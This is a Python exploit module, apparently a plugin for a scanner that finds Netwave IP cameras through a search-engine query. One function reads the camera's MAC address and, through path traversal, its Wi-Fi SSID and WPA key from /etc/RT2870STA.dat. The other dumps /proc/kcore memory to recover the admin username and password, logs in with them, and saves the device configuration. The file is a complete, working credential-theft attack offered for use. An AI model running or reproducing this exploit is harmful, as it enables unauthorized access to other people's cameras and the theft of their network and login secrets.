# -*- coding:utf-8 -*-
import requests
import re
import logging
from requests.exceptions import ConnectionError
__author__ = "writer"
__devtype__ = "Netwave"
__query__ = "app:Netwave IP camera http config"
mac_pattern = re.compile("(?<=id\=\').*?(?=\')")
ssid_pattern = re.compile("(?<=SSID\=).*?(?=\\n)")
wpapsk_pattern = re.compile("(?<=WPAPSK\=).*?(?=\\n)")
string_pattern = re.compile(b'[^\x00-\x1F\x7F-\xFF]{4,}')
# this logger will directly log to front end
logger = logging.getLogger("root")


# ip filter basically testing if can be "pinged"
def _verify(dev):
    ip = dev["ip_addr"]
    logger.info(u"获取地址为%s的主机的信息。。。" % ip)

    try:
        resp = requests.get("http://%s/get_status.cgi" % ip, timeout=20, headers={'Connection': 'close'})
        resp.raise_for_status()
    except requests.exceptions.RequestException:
        logger.info(u"无法获取设备信息，扫描下一个。。。\n")
        return False
    else:
        dev["mac_addr"] = mac_pattern.search(resp.text).group()
        logger.warning(u"目标主机的mac地址为: %s " % dev["mac_addr"])

    try:
        resp = requests.get("http://%s//etc/RT2870STA.dat" % ip, timeout=20, headers={'Connection': 'close'})
        resp.raise_for_status()
        dev["ssid"] = ssid_pattern.search(resp.text).group()
        dev["wpapsk"] = wpapsk_pattern.search(resp.text).group()
    except (requests.exceptions.RequestException, AttributeError):
        logger.info(u"设备未开启无线网络")
    else:
        wireless_info = resp.text.split("\n")
        wireless_info.remove("")  # to beautify the output by reomve all blank lines
        logger.warning(u"目标设备无线网络信息如下：")
        for line in wireless_info:
            logger.warning(line)
    return True


# try to get the username and password and login
def _attack(dev):
    logger.info(u"开始检查主机是否有用户名密码泄露")
    try:
        r = requests.get("http://%s//proc/kcore" % dev["ip_addr"], stream=True, timeout=30)
        r.raise_for_status()
    except requests.exceptions.RequestException:
        logger.info(u"设备不存在内存泄露漏洞，检测下一个\n")
        return True
    mac_addr = dev["mac_addr"].encode()
    count = 0
    r = r.iter_lines()
    while True:
        count += 1
        try:
            line = next(r)
            if mac_addr in line:
                logger.debug(u"在第%s行找到设备信息" % count)
                # monitor the function of strings
                candi = string_pattern.findall(line)
                logger.debug(u"本行信息：%s" % candi)
                idx = candi.index(mac_addr)
                if len(candi) < idx+3:
                    continue
                user = candi[idx + 2].decode("ascii")
                passwd = candi[idx + 3].decode("ascii")
                logger.warning(u"可能的用户名:%s, 密码:%s" % (user, passwd))
                # fixme: is it possible not to close?maybe other info after it?
                r.close()
                resp = requests.get("http://%s/get_params.cgi?user=%s&pwd=%s" % (
                    dev["ip_addr"], user, passwd))
                if resp.status_code == 200:
                    dev["user"] = user
                    dev["passwd"] = passwd
                    logger.error(u"用户名密码验证成功\n")
                    with open("output/%s.txt" % dev["ip_addr"].split(":")[0], "w") as f:
                        f.write(resp.text)
                else:
                    logger.info(u"用户名密码验证失败\n")
                return True
        # some may be b'ipcamera_006E0606CA89'
        except ValueError:
            continue
        except (ConnectionError, StopIteration):
            logger.info(u"在内存文件中未找到用户名密码，共检查%s行\n" % count)
            return True
